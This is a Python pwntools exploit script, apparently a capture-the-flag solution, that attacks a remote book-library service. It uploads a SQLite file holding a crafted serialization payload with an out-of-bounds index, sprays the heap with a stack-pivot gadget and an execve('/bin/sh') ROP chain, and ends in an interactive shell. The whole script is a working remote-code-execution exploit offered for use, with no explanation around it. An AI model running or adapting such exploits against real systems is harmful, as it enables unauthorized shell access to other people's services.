#!/usr/bin/env python3
import pwn
import sys
import base64
import sqlite3
import os
from binascii import hexlify, unhexlify

pwn.context.terminal = ['tmux', 'splitw', '-h']

def makeSprayLib():
    os.system("rm spray_library")
    conn = sqlite3.connect('spray_library')
    cursor = conn.cursor()

    for i in range(56):
        table = f'table{i}' + 'B'*1024
        field = 'B'*1024

        create_table_query = f'''
        CREATE TABLE IF NOT EXISTS {table} (
            id INTEGER PRIMARY KEY,
            {field} BLOB
        );'''

        cursor.execute(create_table_query)
        conn.commit()

    conn.close()

    data = open('spray_library', 'rb').read()
    return base64.b64encode(data)

def makeTriggerLibrary():
    os.system("rm library")
    conn = sqlite3.connect('library')
    cursor = conn.cursor()

    create_table_query = '''
    CREATE TABLE IF NOT EXISTS books (
        id INTEGER PRIMARY KEY,
        data TEXT
    );'''

    cursor.execute(create_table_query)
    conn.commit()

    # 22 serialization::archive 18 <evil_idx> 1 1\n0 3 kek 3 pek 1777
    # 2900, 2355, -3083
    payload = '22 serialization::archive 18 -3083 1 1\n0 3 kek 3 pek 1777'
    cursor.execute(f"INSERT INTO books (data) VALUES ('{payload}');")
    conn.commit()

    data = open('library', 'rb').read()
    return base64.b64encode(data)

if __name__ == "__main__":
    #os.system("rm ./libraries/*")

    r = pwn.remote(sys.argv[1], int(sys.argv[2]), ssl=True)
    trig_lib = makeTriggerLibrary()

    lib_name = os.urandom(16).hex()

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", lib_name.encode())
    r.sendlineafter(b": ", trig_lib)
    r.sendlineafter(b": ", b'n')
    pwn.pause()

    rop_execve = [
        pwn.p64(0x000000000043e26a), # : pop rsi ; ret
        pwn.p64(0x0), # 0x0
        pwn.p64(0x000000000043e26a), # : pop rsi ; ret
        pwn.p64(0xB2D900), # bss addr
        pwn.p64(0x000000000045aad6), # : pop rdx ; ret # <-
        b'/bin/sh\x00',
        pwn.p64(0x00000000006c927f), # : mov qword ptr [rsi], rdx ; ret
        pwn.p64(0x000000000061ca94), # : pop rdi ; pop rbp ; ret)
        pwn.p64(0xB2D900), # bss addr
        pwn.p64(0x0), # bss addr
        pwn.p64(0x000000000043e26a), # : pop rsi ; ret
        pwn.p64(0),
        pwn.p64(0x000000000045aad6), # : pop rdx ; ret
        pwn.p64(0),
        pwn.p64(0x000000000043fd9d), # : pop rax ; ret # <- +8
        pwn.p64(0x3b),
        pwn.p64(0x0000000000417cad) # : syscall
    ]

    payload = b''
    payload = (b'X'*8)*1
    chain = [
        pwn.p64(0x4141414141414141),
        pwn.p64(0x4242424242424242),
        pwn.p64(0x4343434343434343),
        pwn.p64(0x00000000007a1fd6), # FIRST_CALL # mov esp, edx ; mov esi, 0xa ; call qword ptr [rax + 0x50] # PIVOT STACK HERE
        pwn.p64(0x00000000007a1fd6), #
        pwn.p64(0x00000000007a1fd6), #
        pwn.p64(0x0) * 4,
        pwn.p64(0x00000000005f92b1) #  add rsp, 0x10 ; pop r12 ; ret
    ]

    # # # # chain size == 11
    payload += b''.join(chain)

    for i in range(29):
        byte = 0x41 + i
        payload += pwn.p64(byte)

    payload += b''.join(rop_execve)

    print(len(payload)//8)

    byte = 0x41
    while len(payload) != (73*8):
        payload += pwn.p64(byte)
        byte += 1

    # for i in range(73):
    #     byte = 0x41 + i
    #     payload += pwn.p64(byte)

    #payload =  (b''.join(chain) + pwn.p64(address1) + pwn.p64(0x0) + pwn.p64(address2) + pwn.p64(0x0) + pwn.p64(address3) + pwn.p64(0x0)) * 1024
    payload = payload * 64

    # b *0x525A1B
    # fill heap with our spray
    for _ in range(16):
        r.sendlineafter(b"> ", b"2")
        r.sendlineafter(b": ", payload)

    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", lib_name.encode())

    r.interactive()
